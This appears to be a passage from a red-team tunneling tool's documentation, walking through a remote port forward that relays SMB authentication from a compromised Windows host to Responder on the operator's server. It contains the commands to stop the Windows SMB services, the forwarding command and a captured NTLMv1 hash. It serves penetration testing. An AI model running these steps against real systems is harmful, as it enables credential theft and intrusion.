
### Remote Port Forwards

Messenger supports remote port forwards. A service hosted externally can be bridged in and hosted on the same computer as the Messenger client. Although reverse forwards do not require root/administrator access, firewall manipulation and binding to privileged ports typically do. A common example of this functionality is forwarding [Responder](https://github.com/lgandx/Responder)'s SMB capture server onto a compromised Windows host.
1. By default, TCP/445 is in use by the `System` process (PID: 4). In order to start a remote port forwarder on port 445, we first need to [unbind the server service](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac). This will require administrator privileges.
```powershell
Set-Service -ServiceName LanmanServer -StartupType Disabled
Stop-Service -ServiceName LanmanServer
Stop-Service -ServiceName srv2
Stop-Service -ServiceName srvnet
```
2. Verify the SMB service is no longer listening
```
> netstat -ano | findstr 445
```
3. Next, start a Messenger client with a remote forward for TCP port 445. This will start a server bound to all interfaces (0.0.0.0) on TCP/445 on the Messenger client host. Traffic from this forwarder will be sent to 127.0.0.1:445 on the Messenger server after the forward is approved.
```
> python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 0.0.0.0:445:127.0.0.1:445
```
4. After the Messenger client connects, interact with the messenger and enable the remote forward from the server side. If not, the following message will appear in the Messenger server console:
```
[!] Messenger wtwNJsfYRJ has no Remote Port Forwarder configured for 127.0.0.1:445, denying forward!
```

```
[+] WebSocket Messenger `wtwNJsfYRJ` is now connected.
(messenger)~# wtwNJsfYRJ
(wtwNJsfYRJ)~# remote 445
[*] Messenger KacLHgjlol now forwarding (*:*) -> (127.0.0.1:445).
```
5. Start Responder and bind to the loopback interface on the Messenger server:
```
# python3 Responder.py -I lo
```
6. Use a coercion technique or other method to force authentication back to the Messenger client host. As a simple proof of concept, open an Explorer window and enter `\\127.0.0.1\C$` in the folder path. If done correctly, Responder should have captured the forwarded authentication.
```
[SMB] NTLMv1-SSP Client   : 127.0.0.1
[SMB] NTLMv1-SSP Username : BORGAR\kclark
[SMB] NTLMv1-SSP Hash     : kclark::BORGAR:DA0D86D275019B9300000000000000000000000000000000:4E975DA5F409E4475F57BFCC28BBB3BF32F7FE6C29603B08:b26d7ecc63011faa
```